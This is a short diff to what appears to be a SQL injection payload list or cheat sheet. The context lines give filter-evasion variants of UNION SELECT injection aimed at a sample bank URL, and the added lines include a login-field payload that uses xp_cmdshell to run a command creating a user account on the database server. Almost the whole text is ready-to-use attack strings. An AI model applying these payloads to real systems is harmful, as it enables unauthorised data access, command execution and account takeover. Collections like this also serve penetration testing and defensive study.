@@ -263,3 +263,6 @@ http://www.bank.com/accounts.php?id=1+UnIoN/**/SeLecT/**/1,2,3--
 http://www.bank.com/accounts.php?id=1+UNunionION+SEselectLECT+1,2,3--
 http://www.bank.com/accounts.php?id=1+uni%0bon+se%0blect+1,2,3--
 ```
+
+Other Examples
+`/login.asp?username=blah’ or exec master..xp_cmdshell 'net user test testpass --`
